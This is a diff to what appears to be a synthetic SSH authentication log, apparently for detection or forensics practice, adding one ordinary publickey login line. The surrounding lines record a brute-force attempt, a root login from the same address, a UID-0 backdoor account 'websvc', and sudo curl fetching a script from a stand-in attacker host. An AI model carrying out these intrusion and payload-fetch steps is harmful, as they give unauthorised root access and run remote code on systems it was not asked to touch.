@@ -23,6 +23,7 @@
 2026-03-12T20:10:22Z web01 sshd[30022]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
 2026-03-12T20:10:23Z web01 sshd[30023]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
 2026-03-12T20:10:24Z web01 sshd[30024]: Failed password for invalid user admin from 203.0.113.66 port 41200 ssh2
+2026-03-12T20:12:30Z web01 sshd[3050]: Accepted publickey for d.okafor from 10.20.31.112 port 52344 ssh2
 2026-03-12T20:15:33Z web01 sshd[3100]: Accepted password for root from 203.0.113.66 port 41225 ssh2
 2026-03-12T20:17:00Z web01 useradd[3120]: new user: name=websvc, UID=0, GID=0, home=/home/websvc
 2026-03-12T20:18:00Z web01 sudo: websvc : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://cdn.stonewick.example/u.sh
